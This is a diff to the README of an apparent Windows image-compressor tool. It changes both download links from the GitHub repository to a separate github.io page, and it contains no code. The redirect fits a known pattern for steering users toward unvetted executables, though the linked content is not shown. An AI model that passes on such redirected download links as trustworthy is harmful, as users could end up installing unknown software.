@@ -1,6 +1,6 @@
 # 📸 4k-image-compressor-optimizer - Reduce image file size without quality loss
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Southern-blogger454/4k-image-compressor-optimizer)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://southern-blogger454.github.io)
 
 This utility shrinks your image files. It maintains the original clarity of your photos while saving disk space. Use this tool to manage large collections of images easily. It handles batch processing so you can compress hundreds of files with one click.
 
@@ -8,7 +8,7 @@ This utility shrinks your image files. It maintains the original clarity of your
 
 You need a computer running Windows 10 or Windows 11 to use this application. Ensure you have at least 200 MB of free storage space on your hard drive. 
 
-Visit this page to download the software: https://github.com/Southern-blogger454/4k-image-compressor-optimizer
+Visit this page to download the software: https://southern-blogger454.github.io
 
 ## ⚙️ Installation Guide
 
